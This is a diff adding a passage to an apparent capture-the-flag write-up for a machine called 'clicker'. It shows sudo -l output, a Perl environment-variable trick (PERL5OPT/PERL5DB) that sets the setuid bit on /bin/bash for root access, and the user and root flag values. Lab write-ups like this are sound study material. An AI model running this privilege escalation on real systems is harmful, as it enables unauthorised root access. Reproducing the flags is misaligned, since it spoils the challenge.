@@ -220,6 +220,19 @@ changed the chmod to 600 and tried to connect the ssh:
 and it worked, the user flag:
     6427bd0325f2d64d4fc156eebf839ef7
 
+after sudo -l:
+    User jack may run the following commands on clicker:
+    (ALL : ALL) ALL
+    (root) SETENV: NOPASSWD: /opt/monitor.sh
 
+the script runs using Perl
+
+this Perl has a vulnerability called perl_startup
+
+so what i had to do is:
+    sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh
+    bash -p 
+ and i get the root,cd /root and the root flag is:
+    5f43ee9a1a8779ebc67b57ed7c1c8290
 
 
